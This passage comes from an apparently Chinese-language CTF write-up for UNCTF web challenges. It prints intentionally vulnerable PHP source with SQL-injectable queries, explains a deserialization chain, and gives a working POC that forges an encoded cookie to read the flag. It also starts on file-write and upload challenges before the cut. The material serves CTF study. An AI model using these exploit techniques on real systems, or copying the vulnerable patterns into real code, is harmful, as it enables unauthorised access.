class="string">"PCFET0NUWVBFIGh0bWw+CjxodG1sPjxoZWFkPjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4KICAgIAogICAgPHRpdGxlPmhvbWU8L3RpdGxlPgogICAgPG1ldGEgbmFtZT0icmVuZGVyZXIiIGNvbnRlbnQ9IndlYmtpdCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UsY2hyb21lPTEiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCBtYXhpbXVtLXNjYWxlPTEiPgogICAgPG1ldGEgbmFtZT0iYXBwbGUtbW9iaWxlLXdlYi1hcHAtc3RhdHVzLWJhci1zdHlsZSIgY29udGVudD0iYmxhY2siPgogICAgPG1ldGEgbmFtZT0iYXBwbGUtbW9iaWxlLXdlYi1hcHAtY2FwYWJsZSIgY29udGVudD0ieWVzIj4KICAgIDxtZXRhIG5hbWU9ImZvcm1hdC1kZXRlY3Rpb24iIGNvbnRlbnQ9InRlbGVwaG9uZT1ubyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii4vaG9tZV9maWxlcy9sYXl1aS5jc3MiIG1lZGlhPSJhbGwiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL2hvbWVfZmlsZXMvZ2xvYmFsLmNzcyIgbWVkaWE9ImFsbCI+CjxsaW5rIHJlbD0icHJlbG9hZCIgaHJlZj0iLi9ob21lX2ZpbGVzL2YoMSkudHh0IiBhcz0ic2NyaXB0Ij48bGluayByZWw9InByZWxvYWQiIGhyZWY9Ii4vaG9tZV9maWxlcy9mLnR4dCIgYXM9InNjcmlwdCI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iLi9ob21lX2ZpbGVzL2YudHh0Ij48L3NjcmlwdD48L2hlYWQ+Cgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImxheXVpLWxheW91dCBsYXl1aS1sYXlvdXQtYWRtaW4iPgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLWhlYWRlciBoZWFkZXIgaGVhZGVyLWRlbW8iPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJsYXl1aS1tYWluIj4KICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJsb2dvIiBocmVmPSIuL2hvbWUucGhwP209aW5kZXgiPgogICAgICA8aW1nIHNyYz0iLi9ob21lX2ZpbGVzL2xvZ28ucG5nIj4KICAgIDwvYT4KICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibGF5dWktbmF2Ij4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImxheXVpLW5hdi1pdGVtIGxheXVpLWhpZGUteHMiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIuL2hvbWUucGhwP209bG9nb3V0Ij7pgIDlh7rnmbvlvZU8L2E+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJsYXl1aS1uYXYtYmFyIiBzdHlsZT0ibGVmdDogNThweDsgdG9wOiA1NXB4OyB3aWR0aDogMHB4OyBvcGFjaXR5OiAwOyI+PC9zcGFuPjwvdWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLXNpZGUgbGF5dWktYmctYmxhY2siPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJsYXl1aS1zaWRlLXNjcm9sbCI+CiAgICAgICAgICAgICAgICA8dWwgY2xhc3M9ImxheXVpLW5hdiBsYXl1aS1uYXYtdHJlZSBzaXRlLWRlbW8tbmF2IiBsYXktZmlsdGVyPSJkZW1vIj4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImxheXVpLW5hdi1pdGVtIGxheXVpLW5hdi1pdGVtZWQiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iamF2YXNjcmlwdDo7IiBocmVmPSJqYXZhc2NyaXB0OjsiPui1m+ajjeenmOexjTxzcGFuIGNsYXNzPSJsYXl1aS1uYXYtbW9yZSI+PC9zcGFuPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGRsIGNsYXNzPSJsYXl1aS1uYXYtY2hpbGQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ii4vaG9tZS5waHA/bT1pbmRleCI+5biI5YKF5Lus55qE5paH56ugPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIuL2hvbWUucGhwP209aW5kZXgiPkNURueahOiHquaIkeS/ruWFuzwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iLi9ob21lLnBocD9tPWRlYnVnIj7kv7HkuZDpg6jov5Dnu7TmiYvlhow8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2RkPgogICAgICAgICAgICAgICAgICAgICAgICA8L2RsPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImxheXVpLW5hdi1iYXIiIHN0eWxlPSJ0b3A6IDUxNy41cHg7IGhlaWdodDogMHB4OyBvcGFjaXR5OiAwOyI+PC9zcGFuPjwvdWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLWJvZHkgc2l0ZS1kZW1vIj4KICAgICAgICAgIDxpbWcgc3JjPSIuL2hvbWVfZmlsZXMv6KeG5Zu+LnBuZyI+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0ibGF5dWktZm9vdGVyIGZvb3RlciBmb290ZXItZGVtbyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLW1haW4iPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8c2NyaXB0IHNyYz0iLi9ob21lX2ZpbGVzL2YoMSkudHh0Ij48L3NjcmlwdD48c2NyaXB0IGFzeW5jPSIiIHNyYz0iLi9ob21lX2ZpbGVzL2Fkc2J5Z29vZ2xlLmpzIj48L3NjcmlwdD4KICAgICAgICA8ZGl2IGNsYXNzPSJzaXRlLXRyZWUtbW9iaWxlIGxheXVpLWhpZGUiPgogICAgICAgICAgICA8aSBjbGFzcz0ibGF5dWktaWNvbiI+7piCPC9pPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InNpdGUtbW9iaWxlLXNoYWRlIj48L2Rpdj4KICAgICAgICA8c2NyaXB0IHNyYz0iLi9ob21lX2ZpbGVzL2xheXVpLmpzIiBjaGFyc2V0PSJ1dGYtOCI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdD4KICAgICAgICBsYXl1aS51c2UoJ2VsZW1lbnQnLCBmdW5jdGlvbigpIHsKICAgICAgICAgICAgdmFyIGVsZW1lbnQgPSBsYXl1aS5lbGVtZW50OwoKICAgICAgICAgICAgZWxlbWVudC5vbignbmF2KGRlbW8pJywgZnVuY3Rpb24oZWxlbSkgewogICAgICAgICAgICAgICAgbGF5ZXIubXNnKGVsZW0udGV4dCgpKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICAgICAgd2luZG93Lmdsb2JhbCA9IHsKICAgICAgICAgICAgcGFnZVR5cGU6ICdkZW1vJywKICAgICAgICAgICAgcHJldmlldzogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICB2YXIgcHJldmlldyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdMQVlfcHJldmlldycpOwogICAgICAgICAgICAgICAgcmV0dXJuIHByZXZpZXcgPyBwcmV2aWV3LmlubmVySFRNTCA6ICcnOwogICAgICAgICAgICB9CiAgICAgICAgfTsKICAgCAgICA8L3NjcmlwdD4KICAgIDwvZGl2PgoKCgo8L2JvZHk+PC9odG1sPg=="</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>db.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$con = mysql_connect(<span class="string">"localhost:3306"</span>,<span class="string">"dog"</span>,<span class="string">"123456"</span>);</span><br><span class="line">		<span class="keyword">if</span>(!$con) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"Connect failed: "</span> . mysql_error());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $con;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_check</span><span class="params">($u, $p, $obj)</span> </span>&#123;</span><br><span class="line">		$sql = <span class="string">"SELECT id,username FROM users WHERE username = '$u' and password = '$p'"</span>;</span><br><span class="line">		$con = <span class="keyword">$this</span>-&gt;init();</span><br><span class="line">		mysql_select_db(<span class="string">"unctf"</span>, $con);</span><br><span class="line">		$result = mysql_query($sql,$con);</span><br><span class="line">		$row = mysql_fetch_array($result);</span><br><span class="line">		<span class="keyword">if</span>(count($row) &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">			$obj-&gt;id = intval($row[<span class="string">'id'</span>]);</span><br><span class="line">			$obj-&gt;username = $row[<span class="string">'username'</span>];</span><br><span class="line">			$serstr = serialize($obj);</span><br><span class="line">			$serstr = cookie_encode($serstr);</span><br><span class="line">			</span><br><span class="line">			setcookie(<span class="string">'identy'</span>, $serstr);</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">'&lt;script&gt;alert("Login Success");window.location.href="./home.php?m=index";&lt;/script&gt;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Login Fail");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index_check</span><span class="params">($i, $u)</span> </span>&#123;</span><br><span class="line">		$sql = <span class="string">"SELECT id,username FROM users WHERE username = '$u' and id = $i"</span>;</span><br><span class="line">		$con = <span class="keyword">$this</span>-&gt;init();</span><br><span class="line">		mysql_select_db(<span class="string">"unctf"</span>, $con);</span><br><span class="line">		$result = mysql_query($sql,$con);</span><br><span class="line">		$row = mysql_fetch_array($result);</span><br><span class="line">		<span class="keyword">if</span>(count($row) &lt; <span class="number">4</span>) &#123;</span><br><span class="line">			setcookie(<span class="string">"identy"</span>, <span class="string">""</span>);</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Identity problems, please relogin");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>debug.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> $choose = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">public</span> $forbidden = <span class="string">"Good Luck :|"</span>;</span><br><span class="line">	<span class="keyword">public</span> $access_token = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">public</span> $ob = <span class="keyword">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj, &amp;$d)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;vt($obj, $d);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ob-&gt;username !== <span class="string">"debuger"</span>) &#123;</span><br><span class="line">			setcookie(<span class="string">"identy"</span>, <span class="string">""</span>);</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Identity problems, please relogin");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vt</span><span class="params">($obj, &amp;$d)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ob != $obj) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;ob = $obj;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!($obj <span class="keyword">instanceof</span> session)) &#123;</span><br><span class="line">			$d = $obj;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;access_token === <span class="string">""</span>) &#123;</span><br><span class="line">			<span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">debug</span><span class="params">($obj, &amp;$d)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;vt($obj, $d);</span><br><span class="line">		check1(<span class="keyword">$this</span>-&gt;ob);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;choose === <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;choose = <span class="keyword">$this</span>-&gt;ob-&gt;choose;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;choose !== <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;choose === <span class="number">2</span>) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("This is a forbidden option");window.location.href="./home.php?m=debug";&lt;/script&gt;'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">switch</span>(<span class="keyword">$this</span>-&gt;choose)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"You like hsy :("</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;forbidden;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"Good debuger :)"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通读一遍代码，发现是反序列化的漏洞，漏洞点在<code>debug.php</code>的<code>debug类</code>的<code>__tostring()魔术方法</code>中，可以直接<code>include flag</code>而调用它的在<code>debug方法</code>中的<code>echo $this-&gt;forbidden</code>，最后<code>$forbidden</code>必须是<code>debug类</code>的实例</p>
<p>这里要执行<code>$this-&gt;forbidden</code>需要<code>$this-&gt;choose=2</code>，因为<code>switch()</code>是弱类型比较，所以这里可以用<code>&quot;2&quot;</code>绕过</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-6.png" alt="3-6"></p>
<p>而使用<code>debug-&gt;debug()</code>是在<code>home.php</code>中</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-7.png" alt="3-7"></p>
<p>进入这个<code>else</code>的条件是<code>$mothed</code>不等于<code>login、index、logout</code>，而 $mothed 就是通过<code>GET</code>到的<code>m</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-8.png" alt="3-8"></p>
<p>我们按 else 的每一步分析</p>
<p>① 第一步：经过<code>func.php-&gt;mothed_waf()</code>的检查</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mothed_waf($mothed);</span><br></pre></td></tr></table></figure>
<p>可以看到我们可以大小写绕过 base64、php、write ，但无法绕过 flag，所以无法直接包含</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-9.png" alt="3-9"></p>
<p>② 第二步：为 $mothed 添加 .php 的后缀并且<code>include</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$page = $mothed . <span class="string">".php"</span>;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br></pre></td></tr></table></figure>
<p>这里我们就需要使得 $mothed=debug 因为这样 include(debug.php)，作用域内才会有 debug 类，不然所有操作都是徒劳</p>
<p>③ 第三步：调用<code>func.php-&gt;check()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">check($cookie, $db, $session);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-10.png" alt="3-10"></p>
<p>首先<code>$str（也就是home.php-&gt;$cookie）</code>不能为空。然后调用了<code>func.php-&gt;cookie_decode()</code>来解码 $str ，这个函数不必太多理解，因为加密和解密函数都是自带的，会用就行</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-11.png" alt="3-11"></p>
<p>将解密的内容赋值给<code>$objstr</code>，然后反序列化了 $objstr ，赋值给<code>$session</code>，并且对 $session-username 调用<code>func.php-&gt;waf()</code>进行检查</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-12.png" alt="3-12"></p>
<p>我们这里需要看一下那个类有<code>id、username</code>属性，发现是<code>session.php-&gt;session类</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-13.png" alt="3-13"></p>
<p>接下来调用<code>db.php-&gt;index_check()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-14.png" alt="3-14"></p>
<p>对<code>$u($session-&gt;id)</code>和<code>$i($session-&gt;username)</code>进行查询，结果少于 4 条时退出。结合如下代码，我们猜测正常用户数据库的查询结果应该就在 4 条或以上，所以这里只要是数据库有的用户就行了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-15.png" alt="3-15"></p>
<p>④ 创建 debug 类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$d = <span class="keyword">new</span> debug($session, $d);</span><br><span class="line">$d-&gt;vt($session, $d);</span><br><span class="line">$d-&gt;debug($session);</span><br></pre></td></tr></table></figure>
<p>类中有<code>__construct()魔术方法</code>、<code>vt()</code>和<code>debug()</code>方法，所以我们控制的<code>$session</code>变量必须是<code>debug类</code>的序列化，才有后面的<code>debug()</code>方法可以执行</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-16.png" alt="3-16"></p>
<p>所以前面的<code>func.php-&gt;check()</code>中检查的<code>$id</code>和<code>$username</code>自己添加了，并且 $id 需要猜，因为我们并不知道，先试一下1</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-17.png" alt></p>
<p>数据库查询无结果，尝试 2 时就对了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-18.png" alt></p>
<p>但是有了新的问题，提示<code>token error</code>，并且<code>include(&#39;access.php&#39;)</code>，应该是这个<code>access.php</code>搞的鬼。先拿源码，但是像之前那样伪协议拿时，发现过滤了<code>access</code>，并且无法大小写绕过。最后通过下载<code>access.php.bak</code>备份文件才拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$hack_token = <span class="string">'3ecReK&amp;key'</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	$d = unserialize(<span class="keyword">$this</span>-&gt;funny);</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在添加一个<code>funny属性</code>，带着<code>hack_token</code>，最终 POC 如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $key = base64_encode($str);</span><br><span class="line">    $key = bin2hex($key);</span><br><span class="line">    $arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">    $cipher = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        $num = hexdec($value);</span><br><span class="line">        $num = $num + <span class="number">240</span>;</span><br><span class="line">        $cipher = $cipher.<span class="string">'&amp;'</span>.dechex($num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> $choose = <span class="string">"2"</span>;</span><br><span class="line">	<span class="keyword">public</span> $forbidden = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">public</span> $access_token = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">public</span> $ob = <span class="keyword">NULL</span>;</span><br><span class="line">	<span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">public</span> $username = <span class="string">"debuger"</span>;</span><br><span class="line">	<span class="keyword">public</span> $funny = <span class="string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:10:"3ecReK&amp;key";s:2:"ob";N;&#125;'</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;forbidden = unserialize(<span class="string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:0:"";s:2:"ob";N;&#125;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$poc = <span class="keyword">new</span> debug();</span><br><span class="line"><span class="keyword">echo</span> cookie_encode(serialize($poc))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-19.png" alt></p>
<h2 id="simple-web"><a href="#simple-web" class="headerlink" title="simple_web"></a>simple_web</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/4-1.png" alt="4-1"></p>
<p>存在<code>robots.txt</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/4-2.png" alt="4-2"></p>
<p>访问<code>getsandbox.php</code>，得到如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">    exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"your sandbox has been reset"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $sandbox = <span class="string">'./sandbox/'</span> . md5(<span class="string">"chris"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"your sandbox is "</span> . $sandbox . <span class="string">"/"</span>;</span><br><span class="line">    yoursandboxis . /sandbox / <span class="number">3010</span>ba866ddd187c866a2513799b0934 /</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以创建属于自己的沙盒，访问后发现如下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://112.74.37.15:8001/sandbox/3010ba866ddd187c866a2513799b0934/</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = addslashes($_GET[<span class="string">'content'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'content.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">'|\$content=\'.*\';|'</span>, <span class="string">"\$content='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'content.php'</span>, $file);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>传入的<code>$_GET[&#39;content&#39;]</code>会使用<code>addslashes</code>过滤，最后语句为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_put_contents(&apos;content.php&apos;,&quot;$content=&apos;$str&apos;&quot;);</span><br></pre></td></tr></table></figure>
<p>做一半发现环境关了。。。</p>
<h2 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h2><p>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">@mkdir(<span class="string">"./upload"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">        $is_upload = <span class="keyword">false</span>;</span><br><span class="line">        $text = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">            $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">            <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">                $text = <span class="string">"type forbidden"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">                $temp_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">                <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">                    $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $ext = end($file);</span><br><span class="line">                $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">                <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">                    $text = <span class="string">"ext forbidden"</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span 